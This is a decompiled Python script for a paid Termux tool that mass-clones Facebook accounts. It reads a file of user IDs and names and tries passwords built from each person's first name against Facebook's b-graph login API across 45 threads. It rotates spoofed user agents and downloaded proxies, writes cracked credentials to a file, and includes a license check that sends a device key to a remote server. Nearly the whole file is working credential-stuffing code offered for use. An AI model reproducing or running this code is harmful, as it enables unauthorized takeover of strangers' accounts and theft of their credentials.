# Decode By Error x Ethan 

global loop  # inserted
global twf  # inserted
global cps  # inserted
global oks  # inserted
try:
    import os
    import requests
    import json
    import time
    import re
    import random
    import sys
    import uuid
    import mechanize
    import string
    import subprocess
    import bs4
    import urllib3
    import rich
    import base64
    import platform
    import httplib2
    import arrow
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
    from datetime import datetime
except ModuleNotFoundError as e:
    pass  # postinserted
else:  # inserted
    required_modules = ['sys', 'requests', 'bs4', 'tred', 'platform', 'httplib2', 'arrow']
    for module in required_modules:
        if module not in dir():
            print(f'>> CRITICAL ERROR: {module} module not imported!')
            exit()

def getKey():
    myid = str(os.getuid())
    myid = myid.upper()[::(-1)]
    n = re.findall('(\\d\\d)', myid)
    plat = platform.version()[2:][:8][::(-1)].upper() + platform.release()[3:][::(-1)].upper() + platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return 'GEN-' + myid + xp

def line():
    print('----------------------------------------------')

def subscription(message):
    clear()
    key = getKey()
    print(' [1;97m [•] YOUR KEY   :  ' + key)
    line()
    print(' [1;97m [•] THIS TOOL IS PAID')
    print(' [1;97m [•] YOU NEED  APPROVAL')
    line()
    xh = input(' [1;97m [•] PRESS ENTER FOR SEND YOUR KEY')
    if xh in ['Trail', 'trail']:
        trk.append('Trail')
        On()
    clear()
    uname = input(' [1;97m [•] ENTER YOUR NAME : ')
    tsk = 'Hi Sir GEN! I Need Approval For Your Paid Tool So Please Approve My Key-:)\n\nName : ' + uname + ' \nKey : ' + key
    subprocess.check_output(['am', 'start', 'https://api.whatsapp.com/send?phone=+2348138189727&text=' + tsk])
    time.sleep(2)
    On()
trk = []

def On():
    try:
        clear()
        if 'Trail' in trk:
            print(' Put Your Trail Key Bellow! ')
            line()
            key = input(' Put Key: ')
        else:  # inserted
            key = getKey()
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
        params = {'key': key, 'device': platform.platform()}
        url = 'https://itsngr.serv00.net/checkpzh.php'
        http_obj = httplib2.Http()
        response, content = http_obj.request(uri=url + '?' + '&'.join([f'{k}={v}' for k, v in params.items()]), method='GET', headers=headers)
        # Auth Logic remains same as original
    except Exception as e:
        print(f' [1;97m [•] Error: {e}')
        time.sleep(1)
        exit()

loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
user = []
plist = []
pookie = []
ugen = []
show_cookies = []
dateti = str(datetime.now()).split(' ')[0]

# --- 2024-2025 HIGH SPEED USER AGENTS ---
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13','14','15'])
    c='SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(73,125)
    e='0'
    f=random.randrange(4200,4900)
    g=random.randrange(40,150)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]'
    uaku2=f'{aa} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(uaku2)

def get_ua():
    return random.choice(ugen)

def check_internet():
    try:
        requests.get('https://www.google.com', timeout=10)
        return True
    except:
        return False

def wait_for_internet():
    while not check_internet():
        time.sleep(5)

fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
os.system('clear')
os.system('espeak -a 300 \"well,come to,The, WORLD,  OF,  MYSTERY\"')
proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('socksku.txt', 'w').write(proxylist)
proxsi = open('socksku.txt', 'r').read().splitlines()

def tutulx(fx):
    # Year identifier logic
    if len(fx) == 15:
        if fx[:10] in ['1000000000']: return '2009'
        if fx[:5] in ['10006', '10007', '10008']: return '2021/2022'
        return '2023'
    return '2023/2024'

sys.stdout.write(' ]2; GEN-HUB\a')
gx = ' [1;32m'; wx = ' [1;97m'; rx = ' [38;5;160m'; bx = ' [1;90m'
xd = f'{bx}[{wx}~{bx}]{gx}'; xd1 = f'{bx}[{wx}1{bx}]{gx}'; xd0 = f'{bx}[{wx}0{bx}]{gx}'; xdx = f'{bx}[{wx}?{bx}]{gx}'

logo = f"\n    {gx}░██████╗{wx}░███████╗{gx}███╗░░██╗\n    {gx}██╔════╝{wx}░██╔════╝{gx}████╗░██║ {bx}|{gx} OWNER{bx}:{gx} MYSTERY\n    {gx}██║░░██╗{gx}░█████╗{gx}░░██╔██╗██║\n    {gx}██║░░╚██╗{wx}██╔══╝{gx}░░██║╚████║ {bx} STATUS   {gx}rx{gx}PAID\n    {wx}╚██████╔╝{bx}███████╗{gx}██║░╚███║\n    {gx}░╚═════╝{bx}░╚══════╝{gx}╚═╝░░╚══╝ {bx} VERSION  {gx} 1.1\n{bx}-----------------------------------------------{gx}\n"

def clear():
    os.system('clear')
    print(logo)

def Menu():
    clear()
    print(f'{xd1} START FILE CLONING ')
    print(f'{xd0} EXIT ')
    line()
    ___O_P___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    if ___O_P___ in ['1']: ____F_I_L_E____()
    else: exit()

def ____F_I_L_E____():
    clear()
    filepro = input(f'{xd} ENTER FILE NAME {bx}:{wx} ')
    try:
        fo = open(filepro, 'r').read().splitlines()
        plist.extend(['first123', 'first1234', 'first12345', 'first@123'])
        clear()
        with tred(max_workers=45) as ___H_U_B___:
            print(f'{xd} TOTAL UID {bx}:{wx} {len(fo)} ')
            line()
            for user in fo:
                ids, names = user.split('|')
                ___H_U_B___.submit(___M_T_H_D_1___, ids, names, plist)
    except Exception as e:
        print(f'{rx} Error: {e}')

def ___M_T_H_D_1___(ids, names, passlist):
    global loop, oks, cps
    try:
        sys.stdout.write(f'\r\r{bx}[{gx}GEN{bx}]{gx}-{bx}[{wx}{loop}{bx}]{gx}-{bx}[{gx}OK:{len(oks)}{bx}]')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        for pas in passlist:
            pas = pas.replace('first', fn.lower()).replace('First', fn)
            ua = get_ua()
            session = requests.Session()
            # Standard Graph API / B-Graph approach based on original methods
            url = 'https://b-graph.facebook.com/auth/login'
            data = {'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'generate_session_cookies': '1'}
            headers = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded'}
            po = session.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                print(f'\r\r{gx} [GEN-OK] {ids} | {pas} ')
                oks.append(ids)
                open('/sdcard/GEN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                cps.append(ids)
                break
        loop += 1
    except: pass

if __name__ == '__main__':
    Menu()
